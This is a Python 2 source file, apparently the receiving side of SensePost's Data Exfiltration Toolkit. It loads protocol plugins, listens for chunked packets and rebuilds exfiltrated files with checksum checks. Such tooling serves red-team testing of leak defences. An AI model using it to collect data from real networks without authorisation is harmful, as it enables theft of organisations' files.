# -*- coding: utf-8 -*-
import argparse
import hashlib
import json
import os
import random
import signal
import sys
import threading
import time
from zlib import decompress

KEY = ""
MIN_TIME_SLEEP = 1
MAX_TIME_SLEEP = 30
MIN_BYTES_READ = 1
MAX_BYTES_READ = 500
COMPRESSION = True
files = {}
threads = []
config = None


class Colors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'


def display_message(message):
    print "[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message)


def warning(message):
    display_message("%s%s%s" % (Colors.WARNING, message, Colors.ENDC))


def ok(message):
    display_message("%s%s%s" % (Colors.OKGREEN, message, Colors.ENDC))


def info(message):
    display_message("%s%s%s" % (Colors.OKBLUE, message, Colors.ENDC))


# # http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
# def aes_encrypt(message, key=KEY):
#     try:
#         # Generate random CBC IV
#         iv = os.urandom(AES.block_size)
#
#         # Derive AES key from passphrase
#         aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
#
#         # Add PKCS5 padding
#         pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
#
#         # Return data size, iv and encrypted message
#         return iv + aes.encrypt(pad(message))
#     except:
#         return None
#
#
# def aes_decrypt(message, key=KEY):
#     try:
#         # Retrieve CBC IV
#         iv = message[:AES.block_size]
#         message = message[AES.block_size:]
#
#         # Derive AES key from passphrase
#         aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
#         message = aes.decrypt(message)
#
#         # Remove PKCS5 padding
#         unpad = lambda s: s[:-ord(s[len(s) - 1:])]
#
#         return unpad(message)
#     except:
#         return None


# Do a md5sum of the file
def md5(fname):
    hash_function = hashlib.md5()
    with open(fname) as f:
        for chunk in iter(lambda: f.read(4096), ""):
            hash_function.update(chunk)
    return hash_function.hexdigest()


function_mapping = {
    'display_message': display_message,
    'warning': warning,
    'ok': ok,
    'info': info,
    # 'aes_encrypt': aes_encrypt,
    # 'aes_decrypt': aes_decrypt
}


class Exfiltration(object):
    def __init__(self, results, key):
        self.KEY = key
        self.plugin_manager = None
        self.plugins = {}
        self.results = results
        self.target = "127.0.0.1"

        path = "protocols/"
        plugins = {}

        # Load plugins
        sys.path.insert(0, path)
        for f in os.listdir(path):
            fname, ext = os.path.splitext(f)
            if ext == '.py' and self.should_use_plugin(fname):
                mod = __import__(fname)
                plugins[fname] = mod.Plugin(self, config["protocols"][fname])

    def should_use_plugin(self, plugin_name):
        # if the plugin has been specified specifically (-p twitter)
        if self.results.plugin and plugin_name not in self.results.plugin.split(','):
            return False
        else:
            return True

    def register_plugin(self, transport_method, functions):
        self.plugins[transport_method] = functions

    def get_plugins(self):
        return self.plugins

    @staticmethod
    def log_message(mode, message):
        if mode in function_mapping:
            function_mapping[mode](message)

    def get_random_plugin(self):
        plugin_name = random.sample(self.plugins, 1)[0]
        return plugin_name, self.plugins[plugin_name]['send']

    def use_plugin(self, plugins):
        tmp = {}
        for plugin_name in plugins.split(','):
            if plugin_name in self.plugins:
                tmp[plugin_name] = self.plugins[plugin_name]
        self.plugins.clear()
        self.plugins = tmp

    def remove_plugins(self, plugins):
        for plugin_name in plugins:
            if plugin_name in self.plugins:
                del self.plugins[plugin_name]
        display_message("{0} plugins will be used".format(
            len(self.get_plugins())))

    @staticmethod
    def register_file(message):
        global files
        jobid = message[0]
        if jobid not in files:
            files[jobid] = {}
            files[jobid]['checksum'] = message[3].lower()
            files[jobid]['filename'] = message[1].lower()
            files[jobid]['data'] = []
            files[jobid]['packets_number'] = []
            warning("Register packet for file %s with checksum %s" %
                    (files[jobid]['filename'], files[jobid]['checksum']))

    @staticmethod
    def retrieve_file(jobid):
        global files
        fname = files[jobid]['filename']
        filename = "%s.%s" % (fname.replace(
            os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
        content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
        # content = aes_decrypt(content, self.KEY)
        if COMPRESSION:
            content = decompress(content)
        f = open(filename, 'w')
        f.write(content)
        f.close()
        if files[jobid]['checksum'] == md5(filename):
            ok("File %s recovered" % fname)
        else:
            warning("File %s corrupt!" % fname)
        del files[jobid]

    def retrieve_data(self, data):
        global files
        try:
            message = data
            if message.count("|!|") >= 2:
                info("Received {0} bytes".format(len(message)))
                message = message.split("|!|")
                jobid = message[0]

                # register packet
                if message[2] == "REGISTER":
                    self.register_file(message)
                # done packet
                elif message[2] == "DONE":
                    self.retrieve_file(jobid)
                # data packet
                else:
                    # making sure there's a jobid for this file
                    if jobid in files and message[1] not in files[jobid]['packets_number']:
                        files[jobid]['data'].append(''.join(message[2:]))
                        files[jobid]['packets_number'].append(message[1])
        except:
            raise
            pass


def signal_handler(bla, frame):
    global threads
    warning('Killing DET and its subprocesses')
    os.kill(os.getpid(), signal.SIGKILL)


def main():
    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
    global threads, config

    parser = argparse.ArgumentParser(
        description='Data Exfiltration Toolkit (SensePost)')
    parser.add_argument('-c', action="store", dest="config", default=None,
                        help="Configuration file (eg. '-c ./config-sample.json')")
    parser.add_argument('-p', action="store", dest="plugin",
                        default=None, help="Plugins to use (eg. '-p dns,twitter')")
    results = parser.parse_args()

    if results.config is None:
        print "Specify a configuration file!"
        parser.print_help()
        sys.exit(-1)

    with open(results.config) as data_file:
        config = json.load(data_file)

    # catch Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    ok("CTRL+C to kill DET")

    COMPRESSION = bool(config['compression'])
    app = Exfiltration(results, KEY)

    threads = []
    plugins = app.get_plugins()
    for plugin in plugins:
        thread = threading.Thread(target=plugins[plugin]['listen'])
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Join for the threads
    for thread in threads:
        while True:
            thread.join(1)
            if not thread.isAlive():
                break


if __name__ == '__main__':
    main()
